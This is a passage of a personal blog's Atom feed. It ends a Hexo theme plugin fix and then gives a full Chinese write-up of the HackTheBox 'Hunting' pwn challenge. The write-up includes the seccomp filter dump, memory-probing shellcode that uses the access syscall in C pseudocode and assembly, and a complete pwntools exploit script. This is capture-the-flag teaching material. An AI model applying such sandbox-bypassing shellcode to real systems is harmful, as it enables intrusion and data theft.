&lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.site_visit &amp;&amp; theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                 &lt;span&gt;| &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">             &lt;% if (theme.visit_counter.page_visit) &#123; %&gt;</span><br><span class="line">                </span><br><span class="line">                     &lt;span id&#x3D;&quot;page-visit&quot;  title&#x3D;&quot;&lt;%&#x3D; __(&#39;visit_counter.page&#39;) %&gt;&quot;&gt;&lt;i class&#x3D;&quot;fa fa-eye animated infinite pulse&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;&lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                     &lt;&#x2F;span&gt;</span><br><span class="line">                 &lt;&#x2F;span&gt;</span><br><span class="line">             &lt;% &#125; %&gt;</span><br><span class="line">         &lt;&#x2F;div&gt;</span><br><span class="line">     &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>4.打开<code>after-footer.ejs</code>，删除<code>&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</code>.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天强迫症又双发作，这次没忍住，折腾了下。重于把hexo-helper-live2d 与busuanzi 两个插件共存时产生冲突的问题解决了。</summary>
    
    
    
    <category term="Yelee" scheme="lexsd6.github.io/categories/Yelee/"/>
    
    
    <category term="problem_resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
    <category term="node-js" scheme="lexsd6.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>Hunting— HTB  PWN  challenge</title>
    <link href="lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/"/>
    <id>lexsd6.github.io/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/</id>
    <published>2021-11-02T12:58:55.864Z</published>
    <updated>2021-11-03T06:32:40.926Z</updated>
    
    <content type="html"><![CDATA[<p>一道htb中，比较有意思的手写shellcode题。<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>如上，题目是一个32位程序，且保护只开了PIE并开放了读写执行权限。</p><p>分析程序主要流程我们可以看到：</p><p><img src="image-20211102210710626.png" alt="image-20211102210710626"></p><p>程序先mmap一段空间，将flag如这个空间中。</p><p>再用meset把flag原本存放的空间清零。</p><p>然后我们有大小为0x3c来写入我们的后门。</p><p>但是题目设置seccomp沙箱，禁用一些系统调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0002: 0x35 0x0a 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0003: 0x15 0x09 0x00 0x0000000b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x00000166  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000127  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000005  if (A &#x3D;&#x3D; open) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000006  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000008  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000056  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000002  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x000000be  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>由于禁用了execve和open导致我们无法常规getshell或orw</p><p>但经过gdb，我们发现，由于开了PIE,flag的位置是随机的，但是flag位置大小于<code>0x60000000</code>.</p><p><img src="image-20211103102846331.png" alt="image-20211103102846331"></p><p>再进一步分析，可以看到flag在段地址开始的位置。所以我们以<code>0x1000</code>遍历地址，我们就可以发现flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gs 0x6b6d0000</span><br><span class="line">warning: Unable to display strings with size &#39;g&#39;, using &#39;b&#39; instead.</span><br><span class="line">0x6b6d0000:     &quot;HTB&#123;&quot;, &#39;X&#39; &lt;repeats 31 times&gt;, &quot;&#125;&quot;</span><br><span class="line">0x6b6d0025:     &quot;&quot;</span><br><span class="line">0x6b6d0026:     &quot;&quot;</span><br><span class="line">0x6b6d0027:     &quot;&quot;</span><br><span class="line">0x6b6d0028:     &quot;&quot;</span><br><span class="line">0x6b6d0029:     &quot;&quot;</span><br><span class="line">0x6b6d002a:     &quot;&quot;</span><br><span class="line">0x6b6d002b:     &quot;&quot;</span><br><span class="line">0x6b6d002c:     &quot;&quot;</span><br><span class="line">0x6b6d002d:     &quot;&quot;</span><br><span class="line">0x6b6d002e:     &quot;&quot;</span><br><span class="line">0x6b6d002f:     &quot;&quot;</span><br><span class="line">0x6b6d0030:     &quot;&quot;</span><br><span class="line">0x6b6d0031:     &quot;&quot;</span><br><span class="line">0x6b6d0032:     &quot;&quot;</span><br><span class="line">0x6b6d0033:     &quot;&quot;</span><br><span class="line">0x6b6d0034:     &quot;&quot;</span><br><span class="line">0x6b6d0035:     &quot;&quot;</span><br><span class="line">0x6b6d0036:     &quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="如何定位flag"><a href="#如何定位flag" class="headerlink" title="如何定位flag"></a>如何定位flag</h2><h3 id="access函数"><a href="#access函数" class="headerlink" title="access函数"></a>access函数</h3><p>经过查阅资料后我们可以发现access函数不仅可以判断某文件名是否存在还在可以判断某地址段是否存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="keyword">const</span> <span class="keyword">char</span> *filename,<span class="keyword">int</span> mode);</span><br></pre></td></tr></table></figure><p>当mode 为0 时，判断是否存在。</p><p>当mode 为1时，判断是否有执行权限。</p><p>当mode 为2时，判断是否有写权限。</p><p>当mode 为3时，判断是否有读权限。</p><p>filename参数既可以传入文件名，也可以虚拟内存地址。</p><h3 id="for-循环查找"><a href="#for-循环查找" class="headerlink" title="for 循环查找"></a>for 循环查找</h3><p>由于用access函数，我们可以以<code>0x1000</code>为一个单位来慢慢遍历。</p><p>用c伪代码来表达就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> address = <span class="number">0x60000000</span>; address &lt; <span class="number">0x7fffffff</span>; address += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (access(address + i +<span class="number">4</span>) == EFAULT)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>, address, <span class="number">0x26</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用汇编来表达就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov edx,0x5fffffff;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">notaccess:</span><br><span class="line">or dx,0xfff;</span><br><span class="line">inc edx;</span><br><span class="line">mov eax,0x21;</span><br><span class="line">lea  ebx,[edx+4]</span><br><span class="line">int 0x80</span><br><span class="line">cmp eax,0xfffffff2;</span><br><span class="line">jz  notaccess;</span><br><span class="line">mov eax,0x04;</span><br><span class="line">mov ebx,1;</span><br><span class="line">mov ecx,edx;</span><br><span class="line">mov edx,0x26</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/02 19:51:09</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hunting'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'178.62.96.143'</span>,<span class="number">30132</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">shell=<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx,0x5fffffff;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">notaccess:</span></span><br><span class="line"><span class="string">or dx,0xfff;</span></span><br><span class="line"><span class="string">inc edx;</span></span><br><span class="line"><span class="string">mov eax,0x21;</span></span><br><span class="line"><span class="string">lea  ebx,[edx+4]</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">cmp eax,0xfffffff2;</span></span><br><span class="line"><span class="string">jz  notaccess;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x04;</span></span><br><span class="line"><span class="string">mov ebx,1;</span></span><br><span class="line"><span class="string">mov ecx,edx;</span></span><br><span class="line"><span class="string">mov edx,0x26</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="知识点小记"><a href="#知识点小记" class="headerlink" title="知识点小记"></a>知识点小记</h2><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>有几个汇编指令搞忘了，在这里小记下。</p><p>lea  x,[y]</p><p>取y对应的地址作为x的值存入。</p><p>mov x,[y]</p><p>取y对应的地址的值作为x的值存入。</p><p>or  x,y</p><p>对x,y进行或运算，并将值存入x中。</p><p>xor x,y</p><p>xor异或运算,当x,y两个不同时结果为1,否则为0.在汇编中有时也用于清零操作，例如 <code>xor eax,eax</code> 清空eax寄存器。</p><h3 id="延长程序时间"><a href="#延长程序时间" class="headerlink" title="延长程序时间"></a>延长程序时间</h3><p>在看大佬博客<a href="https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。" target="_blank" rel="noopener">https://karol-mazurek95.medium.com/pwn-hunting-challenge-htb-abc635c897db时看到我们在一些时候可以利用系统调用`alarm`来延长程序时间。</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alarm(<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一道htb中，比较有意思的手写shellcode题。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
